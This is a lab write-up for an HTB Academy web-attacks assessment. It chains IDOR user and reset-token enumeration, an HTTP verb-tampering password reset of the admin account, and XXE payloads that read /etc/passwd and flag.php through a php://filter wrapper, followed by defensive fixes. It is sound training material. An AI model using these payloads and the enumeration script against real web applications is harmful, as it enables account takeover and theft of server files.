# HTB Academy — Web Attacks Module: Skill Assessment

> Chaining **IDOR → HTTP Verb Tampering → XXE** for full Account Takeover and source-code exfiltration.

**Path:** Penetration Tester / CWEE prep
**Techniques:** Insecure Direct Object Reference (IDOR), HTTP Verb Tampering, In-Band XXE with PHP Stream Filter
**Tools:** Burp Suite (Repeater), Firefox

---

## Overview

The application trusts client-supplied identity instead of validating it server-side at every boundary. That single design flaw runs through the whole box: the user ID lives in the URL and in a `uid` cookie, the authorization check on the reset endpoint compares two attacker-controlled values, and the event parser resolves external XML entities. Each weakness is medium on its own, but chained together they lead to full compromise.

**Attack chain at a glance:**

1. **Initial Access** — log in as the provided low-privilege user.
2. **IDOR** — enumerate users through the API, find the admin and steal their reset token.
3. **HTTP Verb Tampering → ATO** — abuse the method-dependent authorization check to reset the admin password.
4. **In-Band XXE** — read server-side source via a PHP stream filter and extract the flag.

---

## Phase 0 — Initial Access & Recon

Authenticate with the provided credentials (`htb-student` / `Academy_student!`). The app lands on `profile.php`, a standard dashboard for **Paolo Perrone** at **Schaefer Inc**.
<img width="1918" height="886" alt="homepage" src="https://github.com/user-attachments/assets/97ba2cc5-52fa-45a9-b3cb-b8d9ed0fb847" />


Intercepting the profile request in Burp shows the app already leaks the user's identity in two attacker-controllable places: the ID in the URL and a `uid` cookie. Hitting the API endpoint directly confirms it:

```
GET /api.php/user/74 HTTP/1.1
```

returns the current user's record. **User IDs are used as direct object references with no server-side ownership check** — the setup for IDOR.

---

## Phase 1 — IDOR & API Enumeration

Two sensitive endpoints reference resources purely by the user-supplied ID:

```
/api.php/user/${uid}     # who the user is
/api.php/token/${uid}    # that user's active reset token
```

The backend never verifies that the authenticated user is allowed to read *another* user's profile or token. A quick Bash loop enumerates the user space:

```bash
#!/bin/bash
BASE_URL="http://TARGET:PORT/api.php/user"
for uid in {1..100}; do
    response=$(curl -s -w "\n" "${BASE_URL}/${uid}")
    if [ -n "$response" ]; then
        echo "[*] User ID: ${uid} | ${response}"
    fi
done
```

The admin account surfaces at **ID 52**:

```json
{"uid":"52","username":"a.corrales","full_name":"Amor Corrales","company":"Administrator"}
```

With the admin's ID known, the second endpoint hands over their **active reset token** — no error, no authorization:

```
GET /api.php/token/52 HTTP/1.1
```

```json
{"token":"e51a85fa-17ac-11ec-8e51-e78234eb7b0c"}
```

<img width="1917" height="886" alt="tokenadmin" src="https://github.com/user-attachments/assets/dedda1a6-5e6c-4733-b047-d55a0fb7e51b" />


We now have the admin username **and** a valid reset token. Everything needed to take over the account — except a working reset request.

---

## Phase 2 — HTTP Verb Tampering & Account Takeover

The password reset lives at `/reset.php`, driven by the **Change Your Password** form under `settings.php`.

<img width="1917" height="810" alt="resetpass" src="https://github.com/user-attachments/assets/ef75d059-f849-4734-ae32-f9ba77f96c26" />

The reset needs three parameters: `uid`, `token`, `password`. The backend gates the action with an authorization check that boils down to:

```php
$_COOKIE['uid'] === $_REQUEST['uid']
```

This is broken at the root: **both operands are attacker-controlled.** The cookie is set by us; the request parameter is set by us. The check never consults the server-side session, so it verifies nothing beyond internal consistency. But getting a *successful* reset required understanding exactly how the endpoint reads parameters and which HTTP method it guards — resolved by changing one variable at a time.

### Attempt 1 — POST, parameters in the body → `Access Denied`

A standard `application/x-www-form-urlencoded` POST with the parameters in the request body is **rejected**. The parameters are read (it's not a "missing parameters" error), but the authorization logic — which runs on POST — denies the request.

<img width="1636" height="752" alt="postrequestdenied" src="https://github.com/user-attachments/assets/2d9baf81-bad1-4a5e-930a-c708acc5d536" />


### Attempt 2 — GET, parameters still in the body → `Missing parameters`

Switching the verb to GET but leaving the parameters in the body fails differently: **`Missing parameters`**. A GET request doesn't populate `$_GET` from the body, so from the server's point of view the parameters simply aren't there. This confirms the endpoint reads parameters from the query string, not the body.

<img width="1918" height="891" alt="getrequestmissingpar" src="https://github.com/user-attachments/assets/7be2ea7f-3035-43cf-882c-1173320749d7" />

### Attempt 3 — GET, parameters in the URL → `Password changed successfully`

The winning combination: **GET** (bypassing the POST-only authorization check) with all three parameters in the **query string** (populating `$_GET` → `$_REQUEST`), and the `uid` cookie set to `52`.

```http
GET /reset.php?uid=52&token=e51a85fa-17ac-11ec-8e51-e78234eb7b0c&password=lol HTTP/1.1
Host: TARGET:PORT
Cookie: PHPSESSID=<session>; uid=52
```

```
200 OK
Password changed successfully
```

<img width="1918" height="880" alt="passwordchangesucceffuly" src="https://github.com/user-attachments/assets/504419e2-0036-4be6-992f-b5009f198d9f" />

> **Why this is the real HTTP Verb Tampering.** The authorization check was enforced only on the `POST` handler. Issuing the same action as a `GET` skipped that check entirely, while the app still processed the parameters via `$_REQUEST`. The "parameters in body vs URL" detail was a secondary dependency (`$_GET` population); the decisive factor was the **HTTP method**.

Log in as **`a.corrales` / `lol`** → full admin panel.

---

## Phase 3 — In-Band XXE Injection

With admin access, `event.php` exposes a **Create a new event** form.

<img width="1156" height="660" alt="createeventadmin" src="https://github.com/user-attachments/assets/2ab5b01c-a7c5-4cc6-ae3c-14bfad1e8262" />

**Rule of thumb: send a legitimate request first.** Intercepting a normal submission shows the form ships **raw XML** to `/addEvent.php`, and the `<name>` field is reflected in the response (`Event 'qq' has been created.`). That reflection is our injection point and our In-Band exfiltration channel.

<img width="1910" height="862" alt="xml" src="https://github.com/user-attachments/assets/9fcc60b3-77eb-4b49-b035-b32019c535fe" />


### Step 1 — Confirm entity resolution (internal entity)

Before anything aggressive, verify the parser resolves entities by defining an internal one and referencing it in `<name>`:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE name [
  <!ENTITY company "test">
]>
<root>
  <name>&company;</name>
  <details>aaa</details>
  <date>2026-05-20</date>
</root>
```

The response reflects the resolved value — `Event 'test' has been created.` — confirming the parser processes DTD entities.

<img width="1918" height="888" alt="successfullxxe" src="https://github.com/user-attachments/assets/4639fe8e-6877-4956-9087-58f046aa68e8" />

### Step 2 — External entity → local file read

Point a `SYSTEM` entity at a known file to confirm external entity processing:

```xml
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
```

The contents of `/etc/passwd` come back in the reflected `<name>` — a working **In-Band XXE** with arbitrary file read.

### Step 3 — Read a PHP file via `php://filter`

The target is `/flag.php`. Pointing an entity directly at a PHP file breaks the parser: characters like `<`, `>` and `&` in `<?php ?>` collide with XML syntax. The fix is a **PHP stream filter** that Base64-encodes the file *before* the parser ever sees it — Base64 uses only XML-safe characters (`A–Z a–z 0–9 + / =`):

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE name [
  <!ENTITY company SYSTEM "php://filter/read=convert.base64-encode/resource=/flag.php">
]>
<root>
  <name>&company;</name>
  <details>aaa</details>
  <date>2026-05-20</date>
</root>
```

The response embeds a Base64 blob in the event echo. Selecting it in Burp's **Inspector → Base64 decode** reveals the source:

```php
<?php $flag = "HTB{m45...ck3r}"; ?>
```

<img width="1918" height="882" alt="flag" src="https://github.com/user-attachments/assets/293a2f90-6076-427e-b0ca-3a7c857e170c" />


Same primitive as the `php://filter` LFI trick — the exact wrapper reused across a different injection channel (XXE instead of file inclusion).

---

## Defensive Recommendations

- **IDOR** — validate resource ownership on *every* request; tie object references to the server-side session, never to a user-supplied ID in URL or cookie. Prefer unpredictable identifiers (UUIDs) over sequential numeric IDs.
- **HTTP Verb Tampering** — apply authorization consistently across all methods and all parameter locations (body, query string, cookies) through a single centralized check. Never resolve identity from values the client controls.
- **XXE** — disable external entity and DTD processing at the parser level (in PHP, `libxml_disable_entity_loader(true)` on affected versions; avoid `LIBXML_NOENT`). As defense in depth, don't reflect user-supplied XML values back in responses.
